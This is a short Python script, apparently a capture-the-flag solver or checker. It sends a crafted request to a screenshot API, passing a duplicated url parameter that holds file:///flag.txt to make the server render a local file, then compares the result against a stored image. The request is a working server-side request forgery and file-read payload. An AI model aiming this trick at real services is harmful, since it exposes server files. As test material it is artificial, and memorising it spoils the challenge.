import requests
import os
import sys


IMAGE_PATH = os.path.join(os.path.dirname(__file__), "screenshot.png")


def web_screenshot(host):
    if "http" not in host:
        host = "https://" + host

    try:
        res = requests.get(
            f"{host}/api/screenshot?url=file%3A%2F%2F%2Fflag.txt&url=http",
            timeout=10,
        )
    except requests.exceptions.RequestException:
        return 2

    with open(IMAGE_PATH, "rb") as f:
        if res.content == f.read():
            return 0
        else:
            return 1


if __name__ == "__main__":
    if web_screenshot(sys.argv[1]) != 0:
        exit(1)
